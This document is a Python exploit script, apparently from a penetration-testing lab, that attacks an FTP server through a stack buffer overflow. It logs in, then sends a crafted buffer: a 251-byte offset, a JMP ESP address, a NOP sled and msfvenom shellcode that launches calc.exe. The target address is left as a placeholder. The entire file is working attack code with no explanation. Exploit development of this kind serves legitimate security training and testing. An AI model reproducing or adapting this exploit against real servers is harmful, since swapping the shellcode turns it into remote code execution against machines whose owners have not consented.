import socket
from time import sleep
import sys
# JMP ESP : 7724678A

jmp_esp = '\x8a\x67\x24\x77'
offset = 251
nops = '\x90' * 32

# msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -f c -b '\x00\x0a\x0d'

shellcode = (
"\xda\xc2\xbd\xd6\xbe\xbe\x23\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x31\x31\x6e\x18\x83\xc6\x04\x03\x6e\xc2\x5c\x4b\xdf\x02\x22"
"\xb4\x20\xd2\x43\x3c\xc5\xe3\x43\x5a\x8d\x53\x74\x28\xc3\x5f"
"\xff\x7c\xf0\xd4\x8d\xa8\xf7\x5d\x3b\x8f\x36\x5e\x10\xf3\x59"
"\xdc\x6b\x20\xba\xdd\xa3\x35\xbb\x1a\xd9\xb4\xe9\xf3\x95\x6b"
"\x1e\x70\xe3\xb7\x95\xca\xe5\xbf\x4a\x9a\x04\x91\xdc\x91\x5e"
"\x31\xde\x76\xeb\x78\xf8\x9b\xd6\x33\x73\x6f\xac\xc5\x55\xbe"
"\x4d\x69\x98\x0f\xbc\x73\xdc\xb7\x5f\x06\x14\xc4\xe2\x11\xe3"
"\xb7\x38\x97\xf0\x1f\xca\x0f\xdd\x9e\x1f\xc9\x96\xac\xd4\x9d"
"\xf1\xb0\xeb\x72\x8a\xcc\x60\x75\x5d\x45\x32\x52\x79\x0e\xe0"
"\xfb\xd8\xea\x47\x03\x3a\x55\x37\xa1\x30\x7b\x2c\xd8\x1a\x11"
"\xb3\x6e\x21\x57\xb3\x70\x2a\xc7\xdc\x41\xa1\x88\x9b\x5d\x60"
"\xed\x44\xbc\xa1\x1b\xed\x19\x20\xa6\x70\x9a\x9e\xe4\x8c\x19"
"\x2b\x94\x6a\x01\x5e\x91\x37\x85\xb2\xeb\x28\x60\xb5\x58\x48"
"\xa1\xd6\x3f\xda\x29\x37\xda\x5a\xcb\x47"
)
buffer = 'A'*offset + jmp_esp + nops + shellcode
#while True:
try:
    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c.connect(('iphere', 21))
    c.recv(1024) 
    c.send(('USER TEST \r\n'))
    c.recv(1024)
    c.send(('PASS TEST \r\n'))
    c.recv(1024)
    c.send(buffer + '\r\n')
    c.recv(1024)
    c.send('QUIT\r\n')
    c.close()
    print("[+] Payload sent!")
except:
    sys.exit()
